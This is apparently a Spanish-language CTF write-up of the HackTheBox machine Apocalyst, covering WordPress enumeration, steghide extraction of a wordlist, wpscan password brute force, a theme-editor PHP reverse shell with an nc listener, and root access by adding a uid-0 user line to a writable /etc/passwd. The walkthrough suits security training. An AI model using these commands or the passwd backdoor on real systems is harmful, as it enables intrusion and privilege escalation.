---
title: HTB - Apocalyst
published: true
categories: [Linux]
tags: [eJPT, eWPT, OSCP, Media]
---

<img src="/assets/HTB/Apocalyst/apocalyst.png">

¡Hola!
Vamos a resolver de la máquina `Apocalyst` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Wordpress Enumeration**
- **Image Stego Challenge - Steghide**
- **Information Leakage - User Enumeration**
- **WordPress Exploitation - Theme Editor [RCE]**
- **Abusing misconfigured permissions [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Apocalyst`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.46
PING 10.10.10.46 (10.10.10.46) 56(84) bytes of data.
64 bytes from 10.10.10.46: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.46 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80 10.10.10.46 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Al acceder a la web vemos que no carga del todo correcto. Observando el código fuente vemos referencias al dominio `apocalyst.htb`. Procedemos a incorporarlo a nuestro `/etc/hosts`

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://apocalyst.htb
http://apocalyst.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.112.227], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
```
El servicio web corre bajo Wordpress. Viendo los posts publicados podemos enumerar usuarios válidos. En este caso obtenemos el usuario `falaraki`


<img src="/assets/HTB/Apocalyst/falaraki.png">


Los diccionarios más comunes fallan al devolver cualquier información relevante. Creamos nuestro propio diccionario con la herramienta `Cewl` la cual en base a una url nos genera un diccionario personalizado

```bash
/opt/CeWL/./cewl.rb http://apocalyst.htb > apocalyst.txt
```

Aplicamos fuzzing nuevamente con nuestro diccionario personalizado

```bash
❯ wfuzz -c -L --hc=404 -t 200 -w apocalyst.txt http://apocalyst.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000003:   200        13 L     17 W       157 Ch      "and"                                                                                                                     
000000019:   200        13 L     17 W       157 Ch      "revelation"                                                                                                              
000000018:   200        13 L     17 W       157 Ch      "for"                                                                                                                     
000000017:   200        13 L     17 W       157 Ch      "site"                                                                                                                    
000000014:   200        13 L     17 W       157 Ch      "The"                                                                                                                     
000000021:   200        13 L     17 W       157 Ch      "time"                                                                                                                    
000000020:   200        13 L     17 W       157 Ch      "Comments"                                                                                                                
000000244:   200        13 L     17 W       157 Ch      "get"                                                                                                                     
000000275:   200        13 L     17 W       157 Ch      "blog"                                                                                                                    
000000300:   200        13 L     17 W       157 Ch      "contexts"                                                                                                                
000000313:   200        13 L     17 W       157 Ch      "last"     
```

Nos aparece multitud de respuestas 200 y todas nos llevan a la misma imagen


<img src="/assets/HTB/Apocalyst/wallpaper.png">


Volvemos a aplicar fuzzing pero esta vez ocultando todas las respuestas que nos devuevlan 157 caracteres

```bash
❯ wfuzz -c -L --hh=157 --hc=404 -t 200 -w apocalyst.txt http://apocalyst.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000456:   200        14 L     20 W       175 Ch      "Rightiousness"     
```

Esta ruta nos lleva a la misma imagen, la descargamos para examinarla más detalladamente. Utilizamos la herrramienta `steghide` para ver si tiene información oculta

```bash
❯ steghide info image.jpg
"image.jpg":
  formato: jpeg
  capacidad: 13,0 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "list.txt":
    tamao: 3,6 KB
    encriptado: rijndael-128, cbc
    compactado: si
```

Localizamos un archivo oculto dentro de la imagen, procedemos a extraerlo y al examinarlo vemos que es una lista de palabras.

```bash
❯ steghide extract -sf image.jpg
Anotar salvoconducto: 
anot los datos extrados e/"list.txt".
```

Como tenemos un usuario válido y una lista de posibles contraseñas vamos a utilizar `wpscan` para aplicar fuerza bruta y ver si alguna de las contraseñas es válida

```bash
❯ wpscan --url http://10.10.10.46 --passwords list.txt --usernames falaraki

.
.
.
[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation
 .
 .
 .
```

Nos logueamos y vemos que tenemos un panel de admin en donde podemos editar las templates para inyectar nuestro código php y así entablar una reverse shell


<img src="/assets/HTB/Apocalyst/shell.png">


Abrimos un listener en nuestro equipo atacante, provocamos un error para que se ejecute nuestro template modificado 404.php y ganamos acceso a la máquina víctima

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.46] 44030
bash: cannot set terminal process group (1579): Inappropriate ioctl for device
bash: no job control in this shell
www-data@apocalyst:/var/www/html/apocalyst.htb$ 
```

### Escalada Privilegios

* * *

En el directorio donde nos econtramos vemos el archivo `wp-config.php` el cual es habitual que nos podamos encontrar credenciales. Lo examinamos y encontramos las credenciales de root para mysql


<img src="/assets/HTB/Apocalyst/mysql.png">


Accedemos a mysql pero únicamente encontramos las credenciales de falaraki las cuales ya tenemos

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wp_myblog          |
+--------------------+
5 rows in set (0.01 sec)

mysql> use wp_myblog
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp_myblog   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | falaraki   | $P$BnK/Jm451thx39mQg0AFXywQWZ.e6Z. | falaraki      | admin@apocalyst.htb |          | 2017-07-27 09:33:13 |                     |           0 | falaraki     |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

```

Seguimos con la enumeración con la herramienta `linpeas.sh` del gran Carlos Polop. La subimos a la máquina víctima y ejecutamos. Por el sistema de colores que utiliza la herramienta detectamos rápidamente que en `/ect/passwd` tenemos capacidad de escritura


<img src="/assets/HTB/Apocalyst/privesc.png">


Consultamos la biblia del hacking [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files) y vemos como podemos escalar privilegios modificando el `/etc/passwd`


<img src="/assets/HTB/Apocalyst/hacktricks.png">


En nuestra máquina generamos la password

```bash
❯ mkpasswd -m SHA-512 hacker
$6$Kfas6KpEKTuKg6.N$G34Hz2v5PekYBJN6WRCU42VsK3QhEBENCngc05PxWUTLp68fU3tYth/A/pcukT2ufjiA26lqRmKcfhppkg9oL/
```
En la máquina víctima agregamos una línea tal cual nos explican en Hactricks

```bash
hacker:$6$Kfas6KpEKTuKg6.N$G34Hz2v5PekYBJN6WRCU42VsK3QhEBENCngc05PxWUTLp68fU3tYth/A/pcukT2ufjiA26lqRmKcfhppkg9oL/:0:0:Hacker:/root:/bin/bash
```
Ya podemos conectarnos con las credenciales `hacker:hacker` con privilegios de root

```bash
www-data@apocalyst:/tmp$ su hacker
Password: 
root@apocalyst:/tmp# whoami
root
```

Las flags las encontramos en el directorio de `/home/falaraki/user.txt` y `/root/root.txt`

```bash
root@apocalyst:/home/falaraki# cat /home/falaraki/user.txt
f0e44f5b71cebc74d***************
root@apocalyst:/home/falaraki# cat /root/root.txt
a6237ff44946c2598***************
```

Hemos completado la máquina **Apocalyst** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Apocalyst/pwned.png">
